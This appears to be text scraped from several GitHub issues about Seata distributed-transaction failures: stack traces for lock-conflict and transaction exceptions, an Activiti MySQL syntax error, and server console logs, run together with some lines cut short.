com.alibaba.druid.support.http.webstatfilter.dofilter(webstatfilter.java:123) ~[druid-1.1.10.jar:1.1.10] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:92) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:199) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:490) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:770) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1415) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) ~[na:1.8.0_181] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) ~[na:1.8.0_181] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at java.lang.thread.run(thread.java:748) ~[na:1.8.0_181]
caused by: io.seata.rm.datasource.exec.lockconflictexception: null at io.seata.rm.datasource.connectionproxy.recognizelockkeyconflictexception(connectionproxy.java:128) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:179) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.connectionproxy.commit(connectionproxy.java:156) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:94) [seata-all-0.7.1.jar:0.7.1] ..
69 common frames omitted
and another exception
2019-08-09 14:04:00.854 error 38649 --- [nio-8081-exec-5] o.a.c.c.c.[.[.[/].[dispatcherservlet] : servlet.service() for servlet [dispatcherservlet] in context with path [] threw exception [request processing failed; nested exception is org.springframework.jdbc.uncategorizedsqlexception: preparedstatementcallback; uncategorized sqlexception for sql [update storage_tbl set count = count - ? where commodity_code = ?]; sql state [null]; error code [0]; null; nested exception is io.seata.rm.datasource.exec.lockconflictexception] with root cause io.seata.rm.datasource.exec.lockconflictexception: null at io.seata.rm.datasource.connectionproxy.recognizelockkeyconflictexception(connectionproxy.java:128) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:179) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.connectionproxy.commit(connectionproxy.java:156) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.connectionproxy.setautocommit(connectionproxy.java:218) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:107) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:57) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:87) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.preparedstatementproxy.executeupdate(preparedstatementproxy.java:83) ~[seata-all-0.7.1.jar:0.7.1] at org.springframework.jdbc.core.jdbctemplate.lambda$update$0(jdbctemplate.java:867) ~[spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:617) ~[spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:862) ~[spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:917) ~[spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:927) ~[spring-jdbc-5.1.3.release.jar:5.1.3.release] at io.seata.sample.service.storageservice.deduct(storageservice.java:18) ~[classes/:na] at io.seata.sample.controller.storagecontroller.deduct(storagecontroller.java:20) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_181] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_181] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_181] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_181] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:215) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:142) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:102) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:895) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:800) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1038) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:942) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:998) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:890) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:875) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at com.alibaba.druid.support.http.webstatfilter.dofilter(webstatfilter.java:123) ~[druid-1.1.10.jar:1.1.10] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:92) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:199) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:490) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:770) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1415) [tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-9.0.12.jar:9.0.12] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_181] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_181] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-9.0.12.jar:9.0.12] at java.lang.thread.run(thread.java:748) [na:1.8.0_181]
and in seata-server console
2019-08-09 14:04:00.849 info [serverhandlerthread_80_500]io.seata.core.lock.abstractlocker.acquirelock:112 -global lock on [storage_tbl:9] is holding by 2019050800
2019-08-09 14:04:00.851 error[serverhandlerthread_80_500]io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate:120 -catch transactionexception while do rpc, request: xid=10.112.12.136:8091:2019050814,branchtype=at,resourceid=jdbc:mysql://localhost:3306/seata,lockkey=storage_tbl:9
io.seata.core.exception.transactionexception: null at io.seata.server.coordinator.defaultcore.lambda$branchregister$0(defaultcore.java:79) at io.seata.server.session.globalsession.lockandexcute(globalsession.java:594) at io.seata.server.coordinator.defaultcore.branchregister(defaultcore.java:66) at io.seata.server.coordinator.defaultcoordinator.dobranchregister(defaultcoordinator.java:174) at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:148) at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:144) at io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate(abstractexceptionhandler.java:117) at io.seata.server.abstracttcinboundhandler.handle(abstracttcinboundhandler.java:144) at io.seata.core.protocol.transaction.branchregisterrequest.handle(branchregisterrequest.java:136) at io.seata.server.coordinator.defaultcoordinator.onrequest(defaultcoordinator.java:430) at io.seata.core.rpc.defaultservermessagelistenerimpl.ontrxmessage(defaultservermessagelistenerimpl.java:87) at io.seata.core.rpc.netty.rpcserver.dispatch(rpcserver.java:252) at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:371) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
2019-08-09 14:04:00.860 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:199 -seatamergemessage xid=10.112.12.136:8091:2019050814,extradata=null
,clientip:10.112.12.136,vgroup:my_test_tx_group 2019-08-09 14:04:53.310 info [asyncresolver-bootstrap-executor-0]c.n.discovery.shared.resolver.aws.configclusterresolver.getclusterendpoints:43 -resolving eureka endpoints via configuration ```
other service is ok, no exception output looking forward to your reply
the exception trace: ```
2019-08-09 12:04:18.506 [http-nio-9901-exec-5] error org.activiti.rest.exception.exceptionhandleradvice - unhandled exception
org.apache.ibatis.exceptions.persistenceexception: ### error updating database
cause: java.sql.sqlsyntaxerrorexception: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '' at line 1
### the error may exist in org/activiti/db/mapping/entity/execution.xml
### the error may involve org.activiti.engine.impl.persistence.entity.executionentity.insertexecution-inline
### the error occurred while setting parameters
### sql: insert into act_ru_execution (id_, rev_, proc_inst_id_, business_key_, proc_def_id_, act_id_, is_active_, is_concurrent_, is_scope_,is_event_scope_, parent_id_, super_exec_, suspension_state_, cached_ent_state_, tenant_id_, name_) values ( ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ? )
### cause: java.sql.sqlsyntaxerrorexception: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '' at line 1 at org.apache.ibatis.exceptions.exceptionfactory.wrapexception(exceptionfactory.java:30) at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:200) at org.apache.ibatis.session.defaults.defaultsqlsession.insert(defaultsqlsession.java:185) at org.activiti.engine.impl.db.dbsqlsession.flushregularinsert(dbsqlsession.java:830) at org.activiti.engine.impl.db.dbsqlsession.flushpersistentobjects(dbsqlsession.java:811) at org.activiti.engine.impl.db.dbsqlsession.flushinserts(dbsqlsession.java:794) at org.activiti.engine.impl.db.dbsqlsession.flush(dbsqlsession.java:615) at org.activiti.engine.impl.interceptor.commandcontext.flushsessions(commandcontext.java:212) at org.activiti.engine.impl.interceptor.commandcontext.close(commandcontext.java:138) at org.activiti.engine.impl.interceptor.commandcontextinterceptor.execute(commandcontextinterceptor.java:66) at org.activiti.spring.springtransactioninterceptor$1.dointransaction(springtransactioninterceptor.java:47) at org.springframework.transaction.support.transactiontemplate.execute(transactiontemplate.java:140) at org.activiti.spring.springtransactioninterceptor.execute(springtransactioninterceptor.java:45) at org.activiti.engine.impl.interceptor.loginterceptor.execute(loginterceptor.java:31) at org.activiti.engine.impl.cfg.commandexecutorimpl.execute(commandexecutorimpl.java:40) at org.activiti.engine.impl.cfg.commandexecutorimpl.execute(commandexecutorimpl.java:35) at org.activiti.engine.impl.runtimeserviceimpl.startprocessinstancebykey(runtimeserviceimpl.java:78) at com.xxxxx.bpm.service.bpmserviceimpl.startprocessinstancebykey(bpmserviceimpl.java:404) at com.xxxxx.bpm.service.bpmserviceimpl.toconfirm(bpmserviceimpl.java:1485) at com.xxxxx.bpm.activiti.ex.controller.bpmcontroller.toconfirm(bpmcontroller.java:128) at com.xxxxx.bpm.activiti.ex.controller.bpmcontroller$$fastclassbyspringcglib$$e2262fd8.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:204) at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:746) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) at org.springframework.aop.aspectj.methodinvocationproceedingjoinpoint.proceed(methodinvocationproceedingjoinpoint.java:88) at com.xxxxx.module.mvc.advice.controllermethodautologger.aroundlog(controllermethodautologger.java:91) at sun.reflect.generatedmethodaccessor301.invoke(unknown source) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:497) at org.springframework.aop.aspectj.abstractaspectjadvice.invokeadvicemethodwithgivenargs(abstractaspectjadvice.java:644) at org.springframework.aop.aspectj.abstractaspectjadvice.invokeadvicemethod(abstractaspectjadvice.java:633) at org.springframework.aop.aspectj.aspectjaroundadvice.invoke(aspectjaroundadvice.java:70) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:185) at org.springframework.aop.interceptor.exposeinvocationinterceptor.invoke(exposeinvocationinterceptor.java:92) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:185) at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) at com.xxxxx.bpm.activiti.ex.controller.bpmcontroller$$enhancerbyspringcglib$$1d29fe62.toconfirm(<generated>) at sun.reflect.generatedmethodaccessor592.invoke(unknown source) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:497) at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:209) at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:136) at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:102) at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:891) at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:797) at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:991) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:925) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:981) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:884) at javax.servlet.http.httpservlet.service(httpservlet.java:661) at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:858) at javax.servlet.http.httpservlet.service(httpservlet.java:742) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:52) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.boot.actuate.web.trace.servlet.httptracefilter.dofilterinternal(httptracefilter.java:90) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.httpputformcontentfilter.dofilterinternal(httpputformcontentfilter.java:109) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.webmvcmetricsfilter.filterandrecordmetrics(webmvcmetricsfilter.java:117) at org.springframework.boot.actuate.metrics.web.servlet.webmvcmetricsfilter.dofilterinternal(webmvcmetricsfilter.java:106) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:493) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:140) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:81) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:87) at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:342) at org.apache.coyote.http11.http11processor.service(http11processor.java:800) at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:806) at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1498) at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1142) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:617) at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) at java.lang.thread.run(thread.java:745)
caused by: java.sql.sqlsyntaxerrorexception: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '' at line 1 at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:120) at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:97) at com.mysql.cj.jdbc.exceptions.sqlexceptionsmapping.translateexception(sqlexceptionsmapping.java:122) at com.mysql.cj.jdbc.clientpreparedstatement.executeinternal(clientpreparedstatement.java:970) at com.mysql.cj.jdbc.clientpreparedstatement.executequery(clientpreparedstatement.java:1020) at com.zaxxer.hikari.pool.proxypreparedstatement.executequery(proxypreparedstatement.java:52) at com.zaxxer.hikari.pool.hikariproxypreparedstatement.executequery(hikariproxypreparedstatement.java) at io.seata.rm.datasource.exec.insertexecutor.gettablerecords(insertexecutor.java:195) at io.seata.rm.datasource.exec.insertexecutor.afterimage(insertexecutor.java:76) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:73) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:59) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:90) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:63) at org.apache.ibatis.executor.statement.preparedstatementhandler.update(preparedstatementhandler.java:47) at org.apache.ibatis.executor.statement.routingstatementhandler.update(routingstatementhandler.java:74) at org.apache.ibatis.executor.simpleexecutor.doupdate(simpleexecutor.java:50) at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) at org.apache.ibatis.executor.cachingexecutor.update(cachingexecutor.java:76) at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:198) ..
97 common frames omitted
![image](
try to debug, don't see any problem here, this sql execute fine in navicat.
erver
2019-08-08 15:41:43.431 info [retryrollbacking_1]io.seata.core.rpc.channelmanager.getchannel:377 -choose [id: , l:/127.0.0.1:8091 - r:/127.0.0.1:59236] on the same ip[127.0.0.1] as alternative of dubbo-demo-order-service:127.0.0.1:57501
2019-08-08 15:41:43.436 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:316 -failed to rollback branch br:2018962664/2018962661
2019-08-08 15:41:43.437 info [retryrollbacking_1]io.seata.core.rpc.channelmanager.getchannel:357 -just got exactly the one [id: , l:/127.0.0.1:8091 - r:/127.0.0.1:59236] for dubbo-demo-order-service:127.0.0.1:59236
2019-08-08 15:41:43.439 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:316 -failed to rollback branch br:2018963946/2018963943
"data too long for column " t\'s a simple question ut without any exception info online ![ ]( emote debug
